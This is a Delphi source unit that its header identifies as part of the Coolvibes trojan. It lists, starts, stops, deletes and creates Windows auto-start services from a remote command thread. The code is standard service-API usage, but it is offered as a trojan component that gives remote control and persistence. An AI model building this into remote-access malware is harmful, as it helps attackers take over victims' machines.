{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
relaccionadas con los servicios del sistema}
//Copyright 2006
unit UnitServicios;

interface

uses
  Windows, WinSvc;

type
  TThreadServiciosInfo = class(TObject)
  public
    tipo: Integer; // 0= Iniciar Servicio o detener servicio, 1 = borrar servicio 2 = instalar servicio
    sService: string; //Esta la utilizamos para iniciar,detener, borrar y instalar servico
    //Variables para iniciar o detener
    Change: bool;
    StartStop: bool;
    //Variables para instalar servicio
    sDisplay: string;
    sPath: string;

    ThreadId: Longword;
  end;

  //WinSvc nos permite trabajar con los servicios de manera facil
  //documentada en la ayuda de delphi
function ServiceStrCode(nID: Integer): string;
function ServiceName(sService: string): string; //Obtenemos el nombre
function ServiceStatus(sService: string; Change: bool; StartStop: bool): string;
function ServiceList(): string; //Listamos todos los servicios
function ServicioCrear(sService, sDisplay, sPath: string): bool;
function ServicioBorrar(sService: string): bool;
//Es bol para poder agregar  despues una respuesta alcliente

procedure ThreadServicios(Parameter: Pointer);
implementation

function ServiceStrCode(nID: Integer): string;
begin
  case nID of
    SERVICE_STOPPED: Result := 'Parado';
    SERVICE_RUNNING: Result := 'Corriendo';
    SERVICE_PAUSED: Result := 'Pausado';
    SERVICE_START_PENDING: Result := 'START/PENDING';
    SERVICE_STOP_PENDING: Result := 'STOP/PENDING';
    SERVICE_CONTINUE_PENDING: Result := 'CONTINUE/PENDING';
    SERVICE_PAUSE_PENDING: Result := 'PAUSE/PENDING';
    else
      Result := 'Desconocido';
  end;
end;

function ServiceName(sService: string): string;
var
  schm: SC_HANDLE;
  lpszDisplay: array[0..5600] of char;
  dwSize: DWORD;
begin
  Result := '';
  schm := OpenSCManager(nil, nil, SC_MANAGER_CONNECT);
  if (schm > 0) then
    begin
      GetServiceDisplayName(schm, PChar(sService), lpszDisplay, dwSize);
      Result := lpszDisplay;
      if Result = '' then
        Result := 'N/A';
      CloseServiceHandle(schm);
    end;
end;

function ServiceStatus(sService: string; Change: bool; StartStop: bool): string;
var
  schm, schs: SC_Handle;
  ss: TServiceStatus;
  psTemp: PChar;
  s_s: dword;
begin
  ss.dwCurrentState := 0;
  psTemp := nil;
  schm := OpenSCManager(nil, nil, SC_MANAGER_CONNECT);
  if (schm > 0) then
    begin
      if StartStop = True then
        s_s := SERVICE_START
      else
        s_s := SERVICE_STOP;
      schs := OpenService(schm, PChar(sService), s_s or SERVICE_QUERY_STATUS);
      if (schs > 0) then
        begin
          if change = True then
            if StartStop = True then
              StartService(schs, 0, psTemp)
            else
              ControlService(schs, SERVICE_CONTROL_STOP, ss);
          QueryServiceStatus(schs, ss);
          CloseServiceHandle(schs);
        end;
      CloseServiceHandle(schm);
    end;
  Result := ServiceStrCode(ss.dwCurrentState);
end;

function ServicioBorrar(sService: string): bool;
var
  schm, schs: SC_Handle;
begin
  Result := False;
  schm := OpenSCManager(nil, nil, SC_MANAGER_CONNECT);
  if (schm > 0) then
    begin
      schs := OpenService(schm, PChar(sService), $10000);
      if (schs > 0) then
        begin
          if DeleteService(schs) then
            Result := True;
          CloseServiceHandle(schs);
        end;
      CloseServiceHandle(schm);
    end;
end;

function ServiceList(): string;
var
  j: Integer;
  schm: SC_Handle;
  nBytesNeeded, nServices, nResumeHandle: DWord;
  ServiceStatusRecs: array[0..511] of TEnumServiceStatus;
begin
  schm := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if (schm = 0) then
    Exit;
  nResumeHandle := 0;
  while True do
    begin
      EnumServicesStatus(schm, SERVICE_WIN32, SERVICE_STATE_ALL,
        ServiceStatusRecs[0], SizeOf(ServiceStatusRecs), nBytesNeeded,
        nServices, nResumeHandle);
      for j := 0 to nServices - 1 do
        begin
          Result := Result + ServiceStatusRecs[j].lpServiceName;
          Result :=
            Result + '|' + ServiceName(ServiceStatusRecs[j].lpServiceName);
          Result :=
            Result + '|' + ServiceStatus(ServiceStatusRecs[j].lpServiceName, False, False) + '|';
        end;
      if (nBytesNeeded = 0) then
        Break;
    end;

  if (schm > 0) then
    CloseServiceHandle(schm);
end;

function ServicioCrear(sService, sDisplay, sPath: string): bool;
//funcion para instalar servicios
var
  schm, schs: SC_Handle;
begin
  Result := False;
  schm := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if (schm > 0) then
    begin
      schs := CreateService(schm, PChar(sService), PChar(sDisplay),
        SC_MANAGER_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE, PChar(sPath), nil, nil, nil, nil, nil);
      if schs > 0 then
        Result := True;
      CloseServiceHandle(schs);
      CloseServiceHandle(schm);
    end;
end;

procedure ThreadServicios(Parameter: Pointer);
var
  ThreadInfo: TThreadServiciosInfo;
begin
  ThreadInfo := TThreadServiciosInfo(Parameter);
  if ThreadInfo.tipo = 0 then //Iniciar o detener servicio
    begin
      if ServiceStatus(ThreadInfo.sService, ThreadInfo.Change, ThreadInfo.StartStop) = 'Corriendo' then
        Exitthread(1) //Correctamente inicado
      else
        ExitThread(2); //No se pudo iniciar
    end
  else if ThreadInfo.tipo = 1 then //BorrarServicio
    begin
      if ServicioBorrar(ThreadInfo.sService) then
        ExitThread(1) //correctamente borrado
      else
        ExitThread(2); //Error al borrarlo
    end
  else if ThreadInfo.tipo = 2 then
    begin
      ServicioCrear(ThreadInfo.sService, ThreadInfo.sDisplay, ThreadInfo.sPath)
    end;
  ExitThread(0);
end;

end.
